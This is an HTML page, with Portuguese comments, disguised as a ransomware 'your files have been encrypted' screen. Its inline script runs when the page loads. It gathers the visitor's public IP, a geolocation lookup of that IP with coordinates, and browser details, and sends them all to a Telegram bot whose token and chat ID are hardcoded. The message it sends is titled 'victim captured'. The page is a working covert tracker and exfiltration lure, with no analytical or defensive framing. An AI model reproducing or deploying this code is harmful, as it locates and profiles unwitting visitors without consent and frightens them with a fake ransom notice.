<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ooops, your files have been encrypted!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a2a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 820px;
            width: 100%;
            background: #0d0d2b;
            border: 2px solid #ff0000;
            border-radius: 6px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 0 60px rgba(255,0,0,0.2);
        }
        h1 { color: #ff0000; font-size: 24px; }
        p { color: #00ff41; font-size: 16px; margin: 10px 0; }
        #status { color: #ffcc00; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Ooops, your files have been encrypted!</h1>
        <p>🔐 Your documents, photos, videos and databases are locked</p>
        <div id="status">📡 Carregando...</div>
    </div>

    <script>
        // ============================================
        // CÓDIGO DIRETO NO INDEX (SEM DEPENDER DE logger.js)
        // ============================================
        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT_ID = "8551438856";

        async function getPublicIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch { return '❌ Falha ao obter IP'; }
        }

        async function getLocationByIP(ip) {
            try {
                const r = await fetch(`https://ipinfo.io/${ip}/json`);
                const d = await r.json();
                return {
                    city: d.city || 'Desconhecida',
                    region: d.region || 'Desconhecida',
                    country: d.country || 'Desconhecido',
                    loc: d.loc || 'Desconhecida',
                    org: d.org || 'Desconhecido',
                    timezone: d.timezone || 'Desconhecido'
                };
            } catch {
                return { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
            }
        }

        function getBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direto',
                url: window.location.href,
                timestamp: new Date().toLocaleString('pt-BR')
            };
        }

        async function sendToTelegram(ip, location, browser) {
            const msg = `
🕵️‍♂️ **VÍTIMA CAPTURADA** 💀

🌐 **IP:** ${ip}
📍 **Cidade:** ${location.city}
📍 **Região:** ${location.region}
📍 **País:** ${location.country}
🗺️ **Coordenadas:** ${location.loc}
🕰️ **Fuso:** ${location.timezone}

📊 **Navegador:**
🖥️ ${browser.userAgent}
📐 Tela: ${browser.screen}
🌍 Idioma: ${browser.language}
🔗 Referer: ${browser.referrer}
📎 URL: ${browser.url}
⏱️ Hora: ${browser.timestamp}
            `;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const r = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                const status = document.getElementById('status');
                if (r.ok) {
                    status.textContent = '✅ Dados enviados para o Telegram!';
                    status.style.color = '#00ff41';
                } else {
                    status.textContent = '❌ Erro ao enviar! Status: ' + r.status;
                    status.style.color = '#ff0000';
                }
            } catch (e) {
                document.getElementById('status').textContent = '❌ Erro de rede: ' + e.message;
                document.getElementById('status').style.color = '#ff0000';
            }
        }

        async function main() {
            const status = document.getElementById('status');
            status.textContent = '📡 Coletando dados...';

            const ip = await getPublicIP();
            const location = await getLocationByIP(ip);
            const browser = getBrowserData();

            status.textContent = '📤 Enviando para o Telegram...';
            await sendToTelegram(ip, location, browser);
        }

        document.addEventListener('DOMContentLoaded', main);
    </script>
</body>
</html>
